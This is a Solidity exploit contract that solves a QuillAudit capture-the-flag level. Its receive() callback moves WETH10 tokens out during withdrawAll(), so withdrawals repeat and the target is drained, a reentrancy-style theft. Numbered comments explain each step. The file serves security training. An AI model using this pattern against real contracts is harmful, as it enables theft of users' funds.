// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {WETH10} from "./WETH10.sol";

/* Credits viking71 for explaining this level 
https://infosecwriteups.com/quillaudit-ctf-challenges-writeups-fd5d38f010a4
*/
contract Bob {
    // 1. So firstly we define the address for the EOA for bob
    address payable immutable bob;
    //2.  We define the contract weth10 so we can interact with that contract
    WETH10 immutable weth10;

    //-------------
    constructor(address payable _addrWETH10) {
        bob = payable(msg.sender);
        weth10 = WETH10(_addrWETH10);
    }

    /* 3.This function is called by bob ,
when we callwithdrawAll() it will send 1 ether to this address but...  
*/
    function callBackwithdrawAll() public {
        weth10.withdrawAll();
    }

    //5.Finally we withdraw all the ether in this contract
    function getEtherBack() public {
        (bool sucess, ) = bob.call{value: address(this).balance}("");
        require(sucess, "Failed");
    }

    /* 4. Once the Bob call  callBackwithdrawAll(). In contract WETH10 it will check msg.sender has 
    1 token balance so it is true , then it will tranfer 1 ETHER to this address before function ends the recieve function will   be triggered and 1 token will be transfered to bobs EOA address so we gonna repeat it 10 times ...
   */
    receive() external payable {
        weth10.approve(address(this), weth10.balanceOf(address(this)));
        weth10.transferFrom(
            address(this),
            bob,
            weth10.balanceOf(address(this))
        );
    }
}
